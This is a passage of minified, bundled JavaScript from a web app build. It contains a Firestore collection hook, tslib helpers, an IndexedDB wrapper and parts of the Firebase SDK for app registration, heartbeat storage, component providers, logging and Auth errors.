n?h.push((0,W.Xo)(n)):Array.isArray(n)&&(Array.isArray(n[0])?n:[n]).forEach((([e,t])=>h.push((0,W.Xo)(e,t))))),s&&h.push((0,W.e0)(s)),a&&h.push((0,W.Wu)(a)),o&&h.push((0,W.TQ)(o)),l&&h.push((0,W.Lx)(l)),i&&h.push((0,W.b9)(i)),h.length>0?(0,W.IO)(c,...h):c},oe=(e,t=X.object,n=X.object)=>{let i=(0,s.useRef)(null),{where:a,endAt:o,endBefore:l,startAfter:u,startAt:c,orderBy:h,limit:d,listen:f=!1,parseDates:p,isCollectionGroup:m,ignoreFirestoreDocumentSnapshotField:g=!0}=t,{refreshInterval:y=(f?0:void 0),refreshWhenHidden:v=!f&&void 0,refreshWhenOffline:w=!f&&void 0,revalidateOnFocus:b=!f&&void 0,revalidateOnReconnect:_=!f&&void 0,dedupingInterval:I=(f?0:void 0)}=n,E={...n,refreshInterval:y,refreshWhenHidden:v,refreshWhenOffline:w,revalidateOnFocus:b,revalidateOnReconnect:_,dedupingInterval:I},T=(0,s.useMemo)((()=>JSON.stringify({where:a,endAt:o,endBefore:l,startAfter:u,startAt:c,orderBy:h,limit:d,isCollectionGroup:m})),[o,l,m,d,h,u,c,a]),S=(0,s.useRef)(p);(0,s.useEffect)((()=>{S.current=p}),[p]);let k=(0,s.useRef)(f);(0,s.useEffect)((()=>{k.current=f}));let A=(0,s.useRef)(g);(0,s.useEffect)((()=>{A.current=g}),[g]);let C=H(null===e?null:[e,T],(async(e,t)=>{if(k.current){i.current&&(i.current(),i.current=null);let{unsubscribe:n,initialData:r}=await(async(e,t,{parseDates:n,ignoreFirestoreDocumentSnapshotField:r=!0})=>new Promise((i=>{var s;let a=null!==(s=JSON.parse(t))&&void 0!==s?s:{},o=ae(e,a),l=(0,W.cf)(o,{includeMetadataChanges:!0},(s=>{let a=[];s.forEach((e=>{var t;let i=null!==(t=e.data({serverTimestamps:"estimate"}))&&void 0!==t?t:X.object,s=ie({...i,id:e.id,exists:e.exists(),hasPendingWrites:e.metadata.hasPendingWrites,__snapshot:r?void 0:e},n);Z&&(i.exists||i.id||i.hasPendingWrites)&&console.warn("[use-collection] warning: Your document, ",e.id," is using one of the following reserved fields: [exists, id, hasPendingWrites]. These fields are reserved. Please remove them from your documents."),B(e.ref.path,s,!1),a.push(s)})),i({initialData:a,unsubscribe:l}),B([e,t],a,!1)}))})))(e,t,{parseDates:S.current,ignoreFirestoreDocumentSnapshotField:A.current});return i.current=n,r}return await(async(e,t={},{parseDates:n,ignoreFirestoreDocumentSnapshotField:r}=X.object)=>{let i=ae(e,t);return await(0,W.PL)(i).then((e=>{let t=[];return e.forEach((e=>{var i;let s=null!==(i=e.data({serverTimestamps:"estimate"}))&&void 0!==i?i:X.object,a=ie({...s,id:e.id,exists:e.exists(),hasPendingWrites:e.metadata.hasPendingWrites,__snapshot:r?void 0:e},n);B(e.ref.path,a,!1),Z&&(s.exists||s.id||s.hasPendingWrites)&&console.warn("[get-collection] warning: Your document, ",e.id," is using one of the following reserved fields: [exists, id, hasPendingWrites]. These fields are reserved. Please remove them from your documents."),t.push(a)})),t}))})(e,JSON.parse(t),{parseDates:S.current,ignoreFirestoreDocumentSnapshotField:A.current})}),E),N=(0,s.useRef)(!1);(0,s.useEffect)((()=>{N.current?O.current():N.current=!0}),[f]);let O=(0,s.useRef)(C.mutate);(0,s.useEffect)((()=>{O.current=C.mutate})),(0,s.useEffect)((()=>()=>{i.current&&(i.current(),i.current=null)}),[e,f,T]),(0,s.useEffect)((()=>{e&&Y.addCollectionToCache(e,T)}),[e,T]);let{data:D,isValidating:R,mutate:x,error:P}=C,L=(0,s.useCallback)((t=>{if(!e)return null;let n=Array.isArray(t)?t:[t],i=(0,W.hJ)(r.db,e),s=n.map((e=>({...e,id:(0,W.JU)(i).id})));f||x((e=>[...null!=e?e:X.array,...s]),!1);let a=(0,W.qs)(r.db);return s.forEach((({id:e,...t})=>{a.set((0,W.JU)(i,e),t)})),a.commit()}),[f,x,e]);return{data:D,isValidating:R,mutate:x,error:P,add:L,loading:!D&&!P,unsubscribe:i.current}};var le=n(5816);class ue{constructor(e){var t,n;n=void 0,"db"in(t=this)?Object.defineProperty(t,"db",{value:n,enumerable:!0,configurable:!0,writable:!0}):t.db=n,this.db=(0,le.C6)().length?(0,W.ad)((0,le.Mq)()):(0,W.ad)((0,le.ZF)(e))}}},655:function(e,t,n){"use strict";function r(e,t){var n={};for(var r in e)Object.prototype.hasOwnProperty.call(e,r)&&0>t.indexOf(r)&&(n[r]=e[r]);if(null!=e&&"function"==typeof Object.getOwnPropertySymbols){var i=0;for(r=Object.getOwnPropertySymbols(e);i<r.length;i++)0>t.indexOf(r[i])&&Object.prototype.propertyIsEnumerable.call(e,r[i])&&(n[r[i]]=e[r[i]])}return n}function i(e,t,n,r){return new(n||(n=Promise))((function(i,s){function a(e){try{l(r.next(e))}catch(e){s(e)}}function o(e){try{l(r.throw(e))}catch(e){s(e)}}function l(e){var t;e.done?i(e.value):((t=e.value)instanceof n?t:new n((function(e){e(t)}))).then(a,o)}l((r=r.apply(e,t||[])).next())}))}function s(e,t){var n,r,i,s,a={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return s={next:o(0),throw:o(1),return:o(2)},"function"==typeof Symbol&&(s[Symbol.iterator]=function(){return this}),s;function o(o){return function(l){return function(o){if(n)throw TypeError("Generator is already executing.");for(;s&&(s=0,o[0]&&(a=0)),a;)try{if(n=1,r&&(i=2&o[0]?r.return:o[0]?r.throw||((i=r.return)&&i.call(r),0):r.next)&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[2&o[0],i.value]),o[0]){case 0:case 1:i=o;break;case 4:return a.label++,{value:o[1],done:!1};case 5:a.label++,r=o[1],o=[0];continue;case 7:o=a.ops.pop(),a.trys.pop();continue;default:if(!(i=(i=a.trys).length>0&&i[i.length-1])&&(6===o[0]||2===o[0])){a=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){a.label=o[1];break}if(6===o[0]&&a.label<i[1]){a.label=i[1],i=o;break}if(i&&a.label<i[2]){a.label=i[2],a.ops.push(o);break}i[2]&&a.ops.pop(),a.trys.pop();continue}o=t.call(e,a)}catch(e){o=[6,e],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,l])}}}function a(e,t){var n="function"==typeof Symbol&&e[Symbol.iterator];if(!n)return e;var r,i,s=n.call(e),a=[];try{for(;(void 0===t||t-- >0)&&!(r=s.next()).done;)a.push(r.value)}catch(e){i={error:e}}finally{try{r&&!r.done&&(n=s.return)&&n.call(s)}finally{if(i)throw i.error}}return a}function o(e,t,n){if(n||2==arguments.length)for(var r,i=0,s=t.length;i<s;i++)!r&&i in t||(r||(r=Array.prototype.slice.call(t,0,i)),r[i]=t[i]);return e.concat(r||Array.prototype.slice.call(t))}n.d(t,{CR:function(){return a},Jh:function(){return s},_T:function(){return r},ev:function(){return o},mG:function(){return i}})},5816:function(e,t,n){"use strict";let r,i;n.d(t,{Jn:function(){return x},qX:function(){return O},Xd:function(){return N},Mq:function(){return L},C6:function(){return M},ZF:function(){return P},KN:function(){return F}});var s,a=n(740),o=n(3333),l=n(4444);let u=new WeakMap,c=new WeakMap,h=new WeakMap,d=new WeakMap,f=new WeakMap,p={get(e,t,n){if(e instanceof IDBTransaction){if("done"===t)return c.get(e);if("objectStoreNames"===t)return e.objectStoreNames||h.get(e);if("store"===t)return n.objectStoreNames[1]?void 0:n.objectStore(n.objectStoreNames[0])}return m(e[t])},set:(e,t,n)=>(e[t]=n,!0),has:(e,t)=>e instanceof IDBTransaction&&("done"===t||"store"===t)||t in e};function m(e){var t;if(e instanceof IDBRequest)return function(e){let t=new Promise(((t,n)=>{let r=()=>{e.removeEventListener("success",i),e.removeEventListener("error",s)},i=()=>{t(m(e.result)),r()},s=()=>{n(e.error),r()};e.addEventListener("success",i),e.addEventListener("error",s)}));return t.then((t=>{t instanceof IDBCursor&&u.set(t,e)})).catch((()=>{})),f.set(t,e),t}(e);if(d.has(e))return d.get(e);let n="function"==typeof(t=e)?t!==IDBDatabase.prototype.transaction||"objectStoreNames"in IDBTransaction.prototype?(i||(i=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])).includes(t)?function(...e){return t.apply(g(this),e),m(u.get(this))}:function(...e){return m(t.apply(g(this),e))}:function(e,...n){let r=t.call(g(this),e,...n);return h.set(r,e.sort?e.sort():[e]),m(r)}:(t instanceof IDBTransaction&&function(e){if(c.has(e))return;let t=new Promise(((t,n)=>{let r=()=>{e.removeEventListener("complete",i),e.removeEventListener("error",s),e.removeEventListener("abort",s)},i=()=>{t(),r()},s=()=>{n(e.error||new DOMException("AbortError","AbortError")),r()};e.addEventListener("complete",i),e.addEventListener("error",s),e.addEventListener("abort",s)}));c.set(e,t)}(t),((e,t)=>t.some((t=>e instanceof t)))(t,r||(r=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction]))?new Proxy(t,p):t);return n!==e&&(d.set(e,n),f.set(n,e)),n}let g=e=>f.get(e),y=["get","getKey","getAll","getAllKeys","count"],v=["put","add","delete","clear"],w=new Map;function b(e,t){if(!(e instanceof IDBDatabase)||t in e||"string"!=typeof t)return;if(w.get(t))return w.get(t);let n=t.replace(/FromIndex$/,""),r=t!==n,i=v.includes(n);if(!(n in(r?IDBIndex:IDBObjectStore).prototype)||!i&&!y.includes(n))return;let s=async function(e,...t){let s=this.transaction(e,i?"readwrite":"readonly"),a=s.store;return r&&(a=a.index(t.shift())),(await Promise.all([a[n](...t),i&&s.done]))[0]};return w.set(t,s),s}p={...s=p,get:(e,t,n)=>b(e,t)||s.get(e,t,n),has:(e,t)=>!!b(e,t)||s.has(e,t)};
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class _{constructor(e){this.container=e}getPlatformInfoString(){return this.container.getProviders().map((e=>{if(!function(e){let t=e.getComponent();return"VERSION"===(null==t?void 0:t.type)}(e))return null;{let t=e.getImmediate();return`${t.library}/${t.version}`}})).filter((e=>e)).join(" ")}}let I="@firebase/app",E="0.9.7",T=new o.Yd("@firebase/app"),S="[DEFAULT]",k={[I]:"fire-core","@firebase/app-compat":"fire-core-compat","@firebase/analytics":"fire-analytics","@firebase/analytics-compat":"fire-analytics-compat","@firebase/app-check":"fire-app-check","@firebase/app-check-compat":"fire-app-check-compat","@firebase/auth":"fire-auth","@firebase/auth-compat":"fire-auth-compat","@firebase/database":"fire-rtdb","@firebase/database-compat":"fire-rtdb-compat","@firebase/functions":"fire-fn","@firebase/functions-compat":"fire-fn-compat","@firebase/installations":"fire-iid","@firebase/installations-compat":"fire-iid-compat","@firebase/messaging":"fire-fcm","@firebase/messaging-compat":"fire-fcm-compat","@firebase/performance":"fire-perf","@firebase/performance-compat":"fire-perf-compat","@firebase/remote-config":"fire-rc","@firebase/remote-config-compat":"fire-rc-compat","@firebase/storage":"fire-gcs","@firebase/storage-compat":"fire-gcs-compat","@firebase/firestore":"fire-fst","@firebase/firestore-compat":"fire-fst-compat","fire-js":"fire-js",firebase:"fire-js-all"},A=new Map,C=new Map;function N(e){let t=e.name;if(C.has(t))return T.debug(`There were multiple attempts to register component ${t}.`),!1;for(let n of(C.set(t,e),A.values()))!function(e,t){try{e.container.addComponent(t)}catch(n){T.debug(`Component ${t.name} failed to register with FirebaseApp ${e.name}`,n)}}(n,e);return!0}function O(e,t){let n=e.container.getProvider("heartbeat").getImmediate({optional:!0});return n&&n.triggerHeartbeat(),e.container.getProvider(t)}let D=new l.LL("app","Firebase",{"no-app":"No Firebase App '{$appName}' has been created - call Firebase App.initializeApp()","bad-app-name":"Illegal App name: '{$appName}","duplicate-app":"Firebase App named '{$appName}' already exists with different options or config","app-deleted":"Firebase App named '{$appName}' already deleted","no-options":"Need to provide options, when not being deployed to hosting via source.","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance.","invalid-log-argument":"First argument to `onLog` must be null or a function.","idb-open":"Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.","idb-get":"Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.","idb-set":"Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.","idb-delete":"Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}."});
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class R{constructor(e,t,n){this._isDeleted=!1,this._options=Object.assign({},e),this._config=Object.assign({},t),this._name=t.name,this._automaticDataCollectionEnabled=t.automaticDataCollectionEnabled,this._container=n,this.container.addComponent(new a.wA("app",(()=>this),"PUBLIC"))}get automaticDataCollectionEnabled(){return this.checkDestroyed(),this._automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this.checkDestroyed(),this._automaticDataCollectionEnabled=e}get name(){return this.checkDestroyed(),this._name}get options(){return this.checkDestroyed(),this._options}get config(){return this.checkDestroyed(),this._config}get container(){return this._container}get isDeleted(){return this._isDeleted}set isDeleted(e){this._isDeleted=e}checkDestroyed(){if(this.isDeleted)throw D.create("app-deleted",{appName:this._name})}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let x="9.19.1";function P(e,t={}){let n=e;if("object"!=typeof t){t={name:t}}let r=Object.assign({name:S,automaticDataCollectionEnabled:!1},t),i=r.name;if("string"!=typeof i||!i)throw D.create("bad-app-name",{appName:String(i)});if(n||(n=(0,l.aH)()),!n)throw D.create("no-options");let s=A.get(i);if(s){if((0,l.vZ)(n,s.options)&&(0,l.vZ)(r,s.config))return s;throw D.create("duplicate-app",{appName:i})}let o=new a.H0(i);for(let e of C.values())o.addComponent(e);let u=new R(n,r,o);return A.set(i,u),u}function L(e=S){let t=A.get(e);if(!t&&e===S)return P();if(!t)throw D.create("no-app",{appName:e});return t}function M(){return Array.from(A.values())}function F(e,t,n){var r;let i=null!==(r=k[e])&&void 0!==r?r:e;n&&(i+=`-${n}`);let s=i.match(/\s|\//),o=t.match(/\s|\//);if(s||o){let e=[`Unable to register library "${i}" with version "${t}":`];return s&&e.push(`library name "${i}" contains illegal characters (whitespace or "/")`),s&&o&&e.push("and"),o&&e.push(`version name "${t}" contains illegal characters (whitespace or "/")`),void T.warn(e.join(" "))}N(new a.wA(`${i}-version`,(()=>({library:i,version:t})),"VERSION"))}let U="firebase-heartbeat-store",V=null;function j(){return V||(V=function(e,t,{blocked:n,upgrade:r,blocking:i,terminated:s}={}){let a=indexedDB.open(e,1),o=m(a);return r&&a.addEventListener("upgradeneeded",(e=>{r(m(a.result),e.oldVersion,e.newVersion,m(a.transaction))})),n&&a.addEventListener("blocked",(()=>n())),o.then((e=>{s&&e.addEventListener("close",(()=>s())),i&&e.addEventListener("versionchange",(()=>i()))})).catch((()=>{})),o}("firebase-heartbeat-database",0,{upgrade:(e,t)=>{0===t&&e.createObjectStore(U)}}).catch((e=>{throw D.create("idb-open",{originalErrorMessage:e.message})}))),V}async function B(e,t){try{let n=(await j()).transaction(U,"readwrite"),r=n.objectStore(U);return await r.put(t,q(e)),n.done}catch(e){if(e instanceof l.ZR)T.warn(e.message);else{let t=D.create("idb-set",{originalErrorMessage:null==e?void 0:e.message});T.warn(t.message)}}}function q(e){return`${e.name}!${e.options.appId}`}class ${constructor(e){this.container=e,this._heartbeatsCache=null;let t=this.container.getProvider("app").getImmediate();this._storage=new G(t),this._heartbeatsCachePromise=this._storage.read().then((e=>(this._heartbeatsCache=e,e)))}async triggerHeartbeat(){let e=this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),t=z();return null===this._heartbeatsCache&&(this._heartbeatsCache=await this._heartbeatsCachePromise),this._heartbeatsCache.lastSentHeartbeatDate===t||this._heartbeatsCache.heartbeats.some((e=>e.date===t))?void 0:(this._heartbeatsCache.heartbeats.push({date:t,agent:e}),this._heartbeatsCache.heartbeats=this._heartbeatsCache.heartbeats.filter((e=>{let t=new Date(e.date).valueOf();return Date.now()-t<=2592e6})),this._storage.overwrite(this._heartbeatsCache))}async getHeartbeatsHeader(){if(null===this._heartbeatsCache&&await this._heartbeatsCachePromise,null===this._heartbeatsCache||0===this._heartbeatsCache.heartbeats.length)return"";let e=z(),{heartbeatsToSend:t,unsentEntries:n}=function(e,t=1024){let n=[],r=e.slice();for(let i of e){let e=n.find((e=>e.agent===i.agent));if(e){if(e.dates.push(i.date),K(n)>t){e.dates.pop();break}}else if(n.push({agent:i.agent,dates:[i.date]}),K(n)>t){n.pop();break}r=r.slice(1)}return{heartbeatsToSend:n,unsentEntries:r}}(this._heartbeatsCache.heartbeats),r=(0,l.L)(JSON.stringify({version:2,heartbeats:t}));return this._heartbeatsCache.lastSentHeartbeatDate=e,n.length>0?(this._heartbeatsCache.heartbeats=n,await this._storage.overwrite(this._heartbeatsCache)):(this._heartbeatsCache.heartbeats=[],this._storage.overwrite(this._heartbeatsCache)),r}}function z(){return(new Date).toISOString().substring(0,10)}class G{constructor(e){this.app=e,this._canUseIndexedDBPromise=this.runIndexedDBEnvironmentCheck()}async runIndexedDBEnvironmentCheck(){return!!(0,l.hl)()&&(0,l.eu)().then((()=>!0)).catch((()=>!1))}async read(){if(!await this._canUseIndexedDBPromise)return{heartbeats:[]};return await async function(e){try{return(await j()).transaction(U).objectStore(U).get(q(e))}catch(e){if(e instanceof l.ZR)T.warn(e.message);else{let t=D.create("idb-get",{originalErrorMessage:null==e?void 0:e.message});T.warn(t.message)}}}(this.app)||{heartbeats:[]}}async overwrite(e){var t;if(await this._canUseIndexedDBPromise){let n=await this.read();return B(this.app,{lastSentHeartbeatDate:null!==(t=e.lastSentHeartbeatDate)&&void 0!==t?t:n.lastSentHeartbeatDate,heartbeats:e.heartbeats})}}async add(e){var t;if(await this._canUseIndexedDBPromise){let n=await this.read();return B(this.app,{lastSentHeartbeatDate:null!==(t=e.lastSentHeartbeatDate)&&void 0!==t?t:n.lastSentHeartbeatDate,heartbeats:[...n.heartbeats,...e.heartbeats]})}}}function K(e){return(0,l.L)(JSON.stringify({version:2,heartbeats:e})).length}N(new a.wA("platform-logger",(e=>new _(e)),"PRIVATE")),N(new a.wA("heartbeat",(e=>new $(e)),"PRIVATE")),F(I,E,""),F(I,E,"esm2017"),F("fire-js","")},740:function(e,t,n){"use strict";n.d(t,{H0:function(){return o},wA:function(){return i}});var r=n(4444);class i{constructor(e,t,n){this.name=e,this.instanceFactory=t,this.type=n,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}setInstantiationMode(e){return this.instantiationMode=e,this}setMultipleInstances(e){return this.multipleInstances=e,this}setServiceProps(e){return this.serviceProps=e,this}setInstanceCreatedCallback(e){return this.onInstanceCreated=e,this
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}let s="[DEFAULT]";
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class a{constructor(e,t){this.name=e,this.container=t,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.instancesOptions=new Map,this.onInitCallbacks=new Map}get(e){let t=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(t)){let n=new r.BH;if(this.instancesDeferred.set(t,n),this.isInitialized(t)||this.shouldAutoInitialize())try{let e=this.getOrInitializeService({instanceIdentifier:t});e&&n.resolve(e)}catch(e){}}return this.instancesDeferred.get(t).promise}getImmediate(e){var t;let n=this.normalizeInstanceIdentifier(null==e?void 0:e.identifier),r=null!==(t=null==e?void 0:e.optional)&&void 0!==t&&t;if(!this.isInitialized(n)&&!this.shouldAutoInitialize()){if(r)return null;throw Error(`Service ${this.name} is not available`)}try{return this.getOrInitializeService({instanceIdentifier:n})}catch(e){if(r)return null;throw e}}getComponent(){return this.component}setComponent(e){if(e.name!==this.name)throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);if(this.component)throw Error(`Component for ${this.name} has already been provided`);if(this.component=e,this.shouldAutoInitialize()){if("EAGER"===e.instantiationMode)try{this.getOrInitializeService({instanceIdentifier:s})}catch(e){}for(let[t,n]of this.instancesDeferred.entries()){let r=this.normalizeInstanceIdentifier(t);try{let e=this.getOrInitializeService({instanceIdentifier:r});n.resolve(e)}catch(e){}}}}clearInstance(e=s){this.instancesDeferred.delete(e),this.instancesOptions.delete(e),this.instances.delete(e)}async delete(){let e=Array.from(this.instances.values());await Promise.all([...e.filter((e=>"INTERNAL"in e)).map((e=>e.INTERNAL.delete())),...e.filter((e=>"_delete"in e)).map((e=>e._delete()))])}isComponentSet(){return null!=this.component}isInitialized(e=s){return this.instances.has(e)}getOptions(e=s){return this.instancesOptions.get(e)||{}}initialize(e={}){let{options:t={}}=e,n=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(n))throw Error(`${this.name}(${n}) has already been initialized`);if(!this.isComponentSet())throw Error(`Component ${this.name} has not been registered yet`);let r=this.getOrInitializeService({instanceIdentifier:n,options:t});for(let[e,t]of this.instancesDeferred.entries()){n===this.normalizeInstanceIdentifier(e)&&t.resolve(r)}return r}onInit(e,t){var n;let r=this.normalizeInstanceIdentifier(t),i=null!==(n=this.onInitCallbacks.get(r))&&void 0!==n?n:new Set;i.add(e),this.onInitCallbacks.set(r,i);let s=this.instances.get(r);return s&&e(s,r),()=>{i.delete(e)}}invokeOnInitCallbacks(e,t){let n=this.onInitCallbacks.get(t);if(n)for(let r of n)try{r(e,t)}catch(e){}}getOrInitializeService({instanceIdentifier:e,options:t={}}){let n=this.instances.get(e);if(!n&&this.component&&(n=this.component.instanceFactory(this.container,{instanceIdentifier:e===s?void 0:e,options:t}),this.instances.set(e,n),this.instancesOptions.set(e,t),this.invokeOnInitCallbacks(n,e),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,e,n)}catch(e){}return n||null}normalizeInstanceIdentifier(e=s){return this.component?this.component.multipleInstances?e:s:e}shouldAutoInitialize(){return!!this.component&&"EXPLICIT"!==this.component.instantiationMode}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class o{constructor(e){this.name=e,this.providers=new Map}addComponent(e){let t=this.getProvider(e.name);if(t.isComponentSet())throw Error(`Component ${e.name} has already been registered with ${this.name}`);t.setComponent(e)}addOrOverwriteComponent(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)}getProvider(e){if(this.providers.has(e))return this.providers.get(e);let t=new a(e,this);return this.providers.set(e,t),t}getProviders(){return Array.from(this.providers.values())}}},3333:function(e,t,n){"use strict";var r,i;n.d(t,{Yd:function(){return c},in:function(){return r}});
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
let s=[];(i=r||(r={}))[i.DEBUG=0]="DEBUG",i[i.VERBOSE=1]="VERBOSE",i[i.INFO=2]="INFO",i[i.WARN=3]="WARN",i[i.ERROR=4]="ERROR",i[i.SILENT=5]="SILENT";let a={debug:r.DEBUG,verbose:r.VERBOSE,info:r.INFO,warn:r.WARN,error:r.ERROR,silent:r.SILENT},o=r.INFO,l={[r.DEBUG]:"log",[r.VERBOSE]:"log",[r.INFO]:"info",[r.WARN]:"warn",[r.ERROR]:"error"},u=(e,t,...n)=>{if(t<e.logLevel)return;let r=(new Date).toISOString(),i=l[t];if(!i)throw Error(`Attempted to log a message with an invalid logType (value: ${t})`);console[i](`[${r}]  ${e.name}:`,...n)};class c{constructor(e){this.name=e,this._logLevel=o,this._logHandler=u,this._userLogHandler=null,s.push(this)}get logLevel(){return this._logLevel}set logLevel(e){if(!(e in r))throw TypeError(`Invalid value "${e}" assigned to \`logLevel\``);this._logLevel=e}setLogLevel(e){this._logLevel="string"==typeof e?a[e]:e}get logHandler(){return this._logHandler}set logHandler(e){if("function"!=typeof e)throw TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e}get userLogHandler(){return this._userLogHandler}set userLogHandler(e){this._userLogHandler=e}debug(...e){this._userLogHandler&&this._userLogHandler(this,r.DEBUG,...e),this._logHandler(this,r.DEBUG,...e)}log(...e){this._userLogHandler&&this._userLogHandler(this,r.VERBOSE,...e),this._logHandler(this,r.VERBOSE,...e)}info(...e){this._userLogHandler&&this._userLogHandler(this,r.INFO,...e),this._logHandler(this,r.INFO,...e)}warn(...e){this._userLogHandler&&this._userLogHandler(this,r.WARN,...e),this._logHandler(this,r.WARN,...e)}error(...e){this._userLogHandler&&this._userLogHandler(this,r.ERROR,...e),this._logHandler(this,r.ERROR,...e)}}},4654:function(e,t,n){"use strict";n.d(t,{hJ:function(){return Ie},v0:function(){return Rt},Aj:function(){return Ne},rh:function(){return it}});var r,i=n(4444),s=n(5816),a=n(3333),o=n(655),l=n(740);let u=new i.LL("auth","Firebase",{"dependent-sdk-initialized-before-auth":"Another Firebase SDK was initialized and is trying to use Auth before Auth is initialized. Please be sure to call `initializeAuth` or `getAuth` before starting any other Firebase SDK."}),c=new a.Yd("@firebase/auth");function h(e,...t){c.logLevel<=a.in.ERROR&&c.error(`Auth (${s.Jn}): ${e}`,...t)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function d(e,...t){throw m(e,...t)}function f(e,...t){return m(e,...t)}function p(e,t,n){let r=Object.assign(Object.assign({},{"dependent-sdk-initialized-before-auth":"Another Firebase SDK was initialized and is trying to use Auth before Auth is initialized. Please be sure to call `initializeAuth` or `getAuth` before starting any other Firebase SDK."}),{[t]:n});return new i.LL("auth","Firebase",r).create(t,{appName:e.name})}function m(e,...t){if("string"!=typeof e){let n=t[0],r=[...t.slice(1)];return r[0]&&(r[0].appName=e.name),e._errorFactory.create(n,...r)}return u.create(e,...t)}function g(e,t,...n){if(!e)throw m(t,...n)}function y(e){let t="INTERNAL ASSERTION FAILED: "+e;throw h(t),Error(t)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let v=new Map;function w(e){e instanceof Function||y("Expected a class definition");let t=v.get(e);return t?(t instanceof e||y("Instance stored in cache mismatched with class"),t):(t=new e,v.set(e,t),t)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
